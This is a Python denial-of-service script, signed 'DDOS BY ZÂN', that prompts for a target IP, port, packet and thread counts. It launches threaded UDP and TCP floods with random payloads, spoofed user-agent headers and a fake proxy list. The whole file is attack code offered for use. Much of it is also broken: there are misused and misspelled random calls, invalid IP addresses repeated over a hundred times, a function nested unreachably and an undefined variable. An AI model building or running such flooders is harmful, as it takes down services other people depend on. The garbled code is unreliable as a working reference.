import threading
import socket, requests
import random
import time 
import os, sys
useragents=["""Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1","Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1","Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
"Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
"Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0",
"Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
"Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1",
"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
"Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0",
"Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)",
"Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016"""]
socks3 = [""" 192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080
192.168.0.1:80  45.277.78.89:443 172.104.279.101:8080 """]
ip = str(input("[ ! ] IP >>= "))
ip = socket.gethostbyname(ip)
port = int(input("[ ? ] PORT >>= "))
pack = int(input("[ ? ] PACKET/S >>= "))
thread = int(input("[ ? ] THREAD/T >>= "))
def start():
  global useragents, socks3
  hh = random._urandom(5000)
  xx = random.choice("[#]","[!]","[?]")
  useragen = "UserAgents: "+random.chooce(useragents)+"\r\n"
  sock7 = "Sockets: "+random.choice+(socks3)+"\r\n"
  content = "Content-Type: application/x-www-form-urlencoded\r\n"
  length  = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
  main_req = sock7 + useragen + content + length + "\r\n"
  while True:
        try:
            s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
            s.connect((ip,port))
            s.send((main_req))
            for vr in range(pack):
             s.connect((ip,port))
             s.send((main_req))
             print("[!] DDOS BY ZÂN [!]")
        except:
          s.close()
          print('[+] server error')
  def tcp():
    global useragents, socks3
    data = random._urandom(7000)
    data2 = random.choice("[#]","[!]","[?]")
    useragen = "UserAgents: "+random.choice+"\r\n"
    sock7 = "Sockets: "+random.choice+(socks3)+"\r\n"
    get_host = "GET HTTP/1.1\r\nHost: " + ip + "\r\n"
    post_host = "POST /Attacked-by-HAHA HTTP/1.1\r\nHost: " + ip + "\r\n"
    get_data = "GET https://check-host.net//1.1\r\nHost: " + ip + "\r\n"
    main_req = useragen + sock7 + get_host + post_host + get_data + "\r\n"
    while True:
          try:
             s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
             s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
             s.connect((str(ip),int(port)))
             s.send(str.encode(main_req))
             for i in range(pack):
               s.connect((str(ip),int(port)))
               s.send(str.encode(main_req))
               print("[!] DDOS BY ZÂN [!]")
          except:
             s.close()
             print('[+] server error')
    for kntl in range(th):
      thred = threading.Thread(target=start)
      thred.start()
    else:
      for kntl in range(76000):
       thred2  = threading.Thread(target=tcp)
       thred2.start()
